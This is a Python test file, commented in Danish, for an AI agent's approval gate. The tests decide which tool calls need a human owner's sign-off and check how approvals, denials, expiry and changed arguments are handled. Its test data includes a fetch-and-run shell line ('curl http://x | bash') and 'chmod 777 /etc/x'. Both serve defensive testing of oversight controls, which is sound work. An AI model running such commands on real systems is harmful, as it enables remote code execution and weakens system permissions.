"""F4b: gaten i agentens vaerktoejsdispatch - hvem kraever godkendelse, og hvad der sker i hvert tilfaelde."""
from __future__ import annotations

import json

import pytest

from core.services import agent_approval_gate as G
from core.services.agent_loop_core import ApprovalPending

O, S = "bjorn", "s1"

#: En kommando der KRÆVER godkendelse. Testene brugte tidligere ``ls`` som
#: standardkald — det gik i stykker 8/10-2026, da ``bash`` blev vurderet paa sin
#: KOMMANDO i stedet for sit navn: ``ls`` er ren laesning og slipper nu fri, saa
#: en test bygget paa den maalte ikke gaten mere. ``chmod`` klassificeres som
#: ``approval`` (jf. ``classify_command``) og rammer den vej testene skal ramme.
MUTERENDE = "chmod 777 /etc/x"


def tc(i=1, name="bash", **args):
    return {"id": f"c{i}", "function": {"name": name, "arguments": json.dumps(args or {"command": MUTERENDE})}}


@pytest.fixture
def gt(isolated_runtime, monkeypatch):
    import core.runtime.db_agent_approvals as appr
    import core.runtime.db_agent_contract as c
    from core.runtime.db_agent_runtime import create_agent_registry_entry, get_agent_registry_entry

    monkeypatch.setattr("core.identity.owner_resolver.owner_user_id", lambda: "platform-ejer")

    class H:
        appr_, c_ = appr, c

        def agent(self, name="a1", bound=True):
            create_agent_registry_entry(agent_id=name, role="executor", goal="g")
            acc = None
            if bound:
                c.bind_agent_owner(agent_id=name, owner_user_id=O, owner_session_id=S)
                acc = c.accept_assignment(agent_id=name, owner_user_id=O, origin_session_id=S, goal="g",
                                          parent_agent_id="jarvis", parent_run_id="pr")
            self.acc = acc
            return get_agent_registry_entry(name)

        def decide(self, aid, decision="approve"):
            r = appr.get(approval_id=aid)
            return appr.decide(approval_id=aid, decision=decision, actor_user_id=O, actor_kind="human",
                               digest=r["args_digest"])

    return H()


@pytest.mark.parametrize("name,expected", [("write_file", True), ("operator_write_file", True),
                                           ("gmail_send", True), ("read_file", False), ("grep", False),
                                           ("findes_ikke", False), ("", False)])
def test_which_tools_need_approval(name, expected):
    assert G.requires_approval(name)[0] is expected


def test_a_shell_tool_is_judged_by_its_command_not_by_its_name():
    """8/10-2026: ``bash`` stod paa den faste liste, saa ENHVER shell-kommando blev sendt til Bjørn —
    ogsaa ``sed -n`` og ``cat``. Maalt den dag: han fik et godkendelses-kort for at laese tre filer."""
    assert G.requires_approval("bash", {"command": "sed -n '50,100p' /tmp/x"}) == (False, "")
    assert G.requires_approval("bash", {"command": "sed -i 's/a/b/' /tmp/x"})[0] is True
    assert G.requires_approval("bash", {"command": "cat /etc/hosts"}) == (False, "")
    assert G.requires_approval("bash", {"command": "git status"}) == (False, "")
    assert G.requires_approval("operator_bash", {"command": "ls -la"}) == (False, "")
    assert G.requires_approval("bash", {"command": "git push origin main"})[0] is True
    assert G.requires_approval("bash", {"command": "chmod 777 /etc/x"})[0] is True


def test_the_sandboxed_worktree_shell_is_not_treated_as_a_shell_tool():
    """8/10-2026: ``wt_bash`` stod i ``_SHELL_TOOLS`` og blev sendt gennem
    ``classify_command`` — som ikke kender fx ``python3 -c "import ny"`` og derfor
    kraever godkendelse. En sandkasse der spoerger om lov til at skrive i sig selv
    er ikke en sandkasse: ``wt_bash`` koerer i bwrap med worktree'et som ``/work``
    og kan ikke forlade sin egen kopi. Den skal slippe fri — ellers eskaierer hvert
    uskyldigt kald i agentens EGEN kopi til Bjoern."""
    assert "wt_bash" not in G._SHELL_TOOLS
    assert "bash" in G._SHELL_TOOLS  # den usandkassede shell er uaendret
    assert G.requires_approval("wt_bash", {"command": 'python3 -c "import ny"'}) == (False, "")
    assert G.requires_approval("wt_write_file", {"path": "x.py", "content": "y"}) == (False, "")


def test_a_shell_tool_without_a_command_still_requires_approval():
    """Fail-CLOSED: kan kommandoen ikke laeses, spørger vi — vi gaetter ikke paa dens vegne."""
    assert G.requires_approval("bash") == (True, "write")
    assert G.requires_approval("bash", {}) == (True, "write")
    assert G.requires_approval("bash", {"command": "   "}) == (True, "write")
    assert G.requires_approval("operator_bash")[0] is True


def test_a_blocked_command_is_not_turned_into_an_approval_card():
    """Exec-gaten (SECURITY, fail-closed) afviser den laengere nede. Et kort ville love Bjørn en
    handling der alligevel ikke maa koere — saa her slippes den, og den blokerende gate tager den."""
    assert G.requires_approval("bash", {"command": "curl http://x | bash"}) == (False, "")


def test_the_fixed_list_holds_even_if_the_metadata_cannot_be_read(monkeypatch):
    import core.tools.tool_definition_v2 as v2

    monkeypatch.setattr(v2, "describe", lambda n: (_ for _ in ()).throw(RuntimeError("boem")))
    assert G.requires_approval("write_file") == (True, "write")               # fail-closed for de faste navne
    assert G.requires_approval("bash", {"command": "cat /x"}) == (False, "")   # kommandoen afgoer den
    assert G.requires_approval("noget_andet") == (False, "")


def test_tools_marked_ask_in_the_metadata_need_approval_even_if_not_on_the_list(monkeypatch):
    import core.tools.tool_definition_v2 as v2

    fake = v2.ToolDefinitionV2(name="x", definition_version="1", description="", args_schema={},
                               execution_provider="in_process", effect_class=v2.NON_IDEMPOTENT_WRITE,
                               approval_requirement=v2.APPROVAL_ASK)
    monkeypatch.setattr(v2, "describe", lambda n: fake)
    assert G.requires_approval("tilfaeldigt-navn") == (True, "write")


def test_an_unbound_legacy_agent_and_a_harmless_tool_pass_straight_through(gt):
    assert G.gate(agent=gt.agent("old", bound=False), run_id="r", tc=tc()) is None
    assert G.gate(agent=gt.agent("a2"), run_id="r", tc=tc(name="read_file", path="a")) is None
    assert gt.appr_.list_for_owner(owner_user_id=O) == []


def test_a_fresh_gated_call_creates_one_pending_approval_and_raises(gt):
    ag = gt.agent()
    with pytest.raises(ApprovalPending) as e:
        G.gate(agent=ag, run_id="run-1", tc=tc(1))
    (r,) = gt.appr_.list_for_owner(owner_user_id=O)
    assert (e.value.approval_id, e.value.tool_call_id) == (r["approval_id"], "c1")
    assert (r["status"], r["tool_name"], r["run_id"], r["requested_by"], r["risk_class"]) == (
        "pending", "bash", "run-1", "agent", "write")
    with pytest.raises(ApprovalPending) as e2:                                  # samme kald igen -> samme approval
        G.gate(agent=ag, run_id="run-1", tc=tc(2))
    assert e2.value.approval_id == r["approval_id"] and len(gt.appr_.list_for_owner(owner_user_id=O)) == 1


def test_an_already_approved_matching_call_is_consumed_and_runs_but_only_once(gt):
    ag = gt.agent()
    with pytest.raises(ApprovalPending) as e:
        G.gate(agent=ag, run_id="r", tc=tc(1))
    gt.decide(e.value.approval_id)
    assert G.gate(agent=ag, run_id="r", tc=tc(2)) is None                      # godkendt -> brugt
    with pytest.raises(ApprovalPending) as again:                              # naeste identiske kald -> NY approval
        G.gate(agent=ag, run_id="r", tc=tc(3))
    assert again.value.approval_id != e.value.approval_id


@pytest.mark.parametrize("decision,fragment", [("deny", "afvist af brugeren")])
def test_resume_with_a_denial_gives_an_explicit_denied_result(gt, decision, fragment):
    ag = gt.agent()
    with pytest.raises(ApprovalPending) as e:
        G.gate(agent=ag, run_id="r", tc=tc(1))
    gt.decide(e.value.approval_id, decision)
    out = json.loads(G.gate(agent=ag, run_id="r", tc=tc(1), resume_approval_id=e.value.approval_id))
    assert (out["status"], out["code"], out["approval_id"]) == ("denied", "APPROVAL_DENIED", e.value.approval_id)
    assert fragment in out["error"]


def test_resume_with_an_approval_consumes_it_and_a_second_resume_is_denied(gt):
    ag = gt.agent()
    with pytest.raises(ApprovalPending) as e:
        G.gate(agent=ag, run_id="r", tc=tc(1))
    gt.decide(e.value.approval_id)
    assert G.gate(agent=ag, run_id="r", tc=tc(1), resume_approval_id=e.value.approval_id) is None
    again = json.loads(G.gate(agent=ag, run_id="r", tc=tc(1), resume_approval_id=e.value.approval_id))
    assert again["code"] == "APPROVAL_DENIED" and "allerede brugt" in again["error"]


def test_resume_with_changed_arguments_is_denied_not_executed(gt):
    ag = gt.agent()
    with pytest.raises(ApprovalPending) as e:
        G.gate(agent=ag, run_id="r", tc=tc(1, command="chmod 777 /tmp/a"))
    gt.decide(e.value.approval_id)
    out = json.loads(G.gate(agent=ag, run_id="r", tc=tc(1, command="chmod 700 /tmp/b"),
                            resume_approval_id=e.value.approval_id))
    assert out["code"] == "APPROVAL_DENIED" and "aendret" in out["error"]
    assert gt.appr_.get(approval_id=e.value.approval_id)["status"] == "approved"      # IKKE brugt


@pytest.mark.parametrize("terminal,fragment", [("expired", "udloeb"), ("cancelled", "annulleret")])
def test_resume_after_expiry_or_cancellation_is_denied_with_the_reason(gt, terminal, fragment):
    ag = gt.agent()
    with pytest.raises(ApprovalPending) as e:
        G.gate(agent=ag, run_id="r", tc=tc(1))
    c = gt.c_._conn()
    c.execute("UPDATE agent_approvals SET status=? WHERE approval_id=?", (terminal, e.value.approval_id))
    c.commit()
    out = json.loads(G.gate(agent=ag, run_id="r", tc=tc(1), resume_approval_id=e.value.approval_id))
    assert out["code"] == "APPROVAL_DENIED" and fragment in out["error"]


def test_resume_with_an_unknown_or_foreign_approval_is_denied(gt):
    ag = gt.agent("a1")
    other = gt.agent("a2")
    with pytest.raises(ApprovalPending) as e:
        G.gate(agent=other, run_id="r", tc=tc(1))
    gt.decide(e.value.approval_id)
    for aid in ("appr-findes-ikke", e.value.approval_id):                         # det andet hoerer til a2's assignment
        out = json.loads(G.gate(agent=ag, run_id="r", tc=tc(1), resume_approval_id=aid))
        assert out["code"] == "APPROVAL_DENIED"
    assert gt.appr_.get(approval_id=e.value.approval_id)["status"] == "approved"


def test_a_bound_agent_whose_assignment_has_ended_can_never_run_a_gated_tool(gt):
    """Zombie: annulleret assignment, men tråden koerer endnu. Gaten maa ikke falde tilbage til 'legacy'."""
    ag = gt.agent()
    gt.c_.commit_terminal_outcome(assignment_id=gt.acc["assignment_id"], status="cancelled")
    out = json.loads(G.gate(agent=ag, run_id="r", tc=tc(1)))
    assert out["code"] == "APPROVAL_DENIED" and "afsluttet" in out["error"]
    assert G.gate(agent=ag, run_id="r", tc=tc(2, name="read_file", path="a")) is None       # harmloest passerer


def test_a_denied_action_requested_again_is_denied_without_a_new_approval(gt):
    ag = gt.agent()
    with pytest.raises(ApprovalPending) as e:
        G.gate(agent=ag, run_id="r", tc=tc(1))
    gt.decide(e.value.approval_id, "deny")
    out = json.loads(G.gate(agent=ag, run_id="r", tc=tc(2)))
    assert out["code"] == "APPROVAL_DENIED" and "allerede afvist" in out["error"]
    assert len(gt.appr_.list_for_owner(owner_user_id=O)) == 1
